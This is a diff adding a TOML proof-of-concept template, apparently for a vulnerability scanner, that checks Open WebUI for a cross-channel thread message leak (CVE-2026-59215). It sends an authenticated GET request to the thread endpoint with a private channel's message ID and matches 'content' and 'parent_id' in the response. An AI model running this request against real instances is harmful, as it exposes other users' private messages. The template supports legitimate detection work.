@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 频道线程 parent_id 未绑定频道导致的跨频道消息泄露。已认证用户通过 GET /api/v1/channels/{channel_id}/messages/{message_id}/thread 接口，将私有频道消息 ID 作为 parent_id 传入，检测响应是否返回非本频道的消息内容、频道 ID 及作者信息"
+id = "POC-AVE-2026-0814"
+name = "CVE-2026-59215 Open WebUI 跨频道线程消息泄露 PoC"
+severity = "low"
+tags = ["ave-2026-0814"]
+vuln_id = [
+    "CVE-2026-59215",
+    "AVE-2026-0814",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/channels/{{public_channel_id}}/messages/{{target_message_id}}/thread"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "content",
+    "parent_id",
+]
